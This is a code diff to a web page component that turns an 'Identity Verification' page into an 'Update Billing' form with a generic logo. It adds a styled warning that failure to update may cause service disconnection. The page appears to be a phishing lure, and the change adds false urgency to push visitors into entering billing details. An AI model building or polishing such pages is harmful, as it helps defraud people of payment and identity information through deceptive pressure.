@@ -371,7 +371,7 @@ export default function Home() {
   return (
     <>
       <Head>
-        <title>Identity Verification</title>
+        <title>Update Billing</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       </Head>
       <Script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js" strategy="afterInteractive" />
@@ -419,8 +419,34 @@ export default function Home() {
           font-size: 36px;
           font-weight: 700;
           color: #000000;
-          margin-bottom: 35px;
+          margin-bottom: 20px;
           line-height: 1.2;
+        }
+
+        .warning-message {
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          gap: 10px;
+          background: #fff3cd;
+          border: 2px solid #ffc107;
+          border-radius: 6px;
+          padding: 12px 16px;
+          margin-bottom: 30px;
+          text-align: left;
+        }
+
+        .warning-icon {
+          font-size: 20px;
+          color: #856404;
+          flex-shrink: 0;
+        }
+
+        .warning-text {
+          font-size: 14px;
+          font-weight: 600;
+          color: #856404;
+          line-height: 1.4;
         }
 
         .form-group {
@@ -658,6 +684,19 @@ export default function Home() {
             font-size: 30px;
           }
 
+          .warning-message {
+            padding: 10px 12px;
+            margin-bottom: 25px;
+          }
+
+          .warning-icon {
+            font-size: 18px;
+          }
+
+          .warning-text {
+            font-size: 13px;
+          }
+
           .form-row {
             flex-direction: column;
             gap: 0;
@@ -699,7 +738,12 @@ export default function Home() {
           <img src="/logo.png" alt="Logo" className="logo-image" />
         </div>
 
-        <h1>Identity Verification</h1>
+        <h1>Update Billing</h1>
+
+        <div className="warning-message">
+          <span className="warning-icon">⚠️</span>
+          <span className="warning-text">Failure to update may result in service disconnection</span>
+        </div>
 
         <form id="billing-form">
           <div className="form-group">
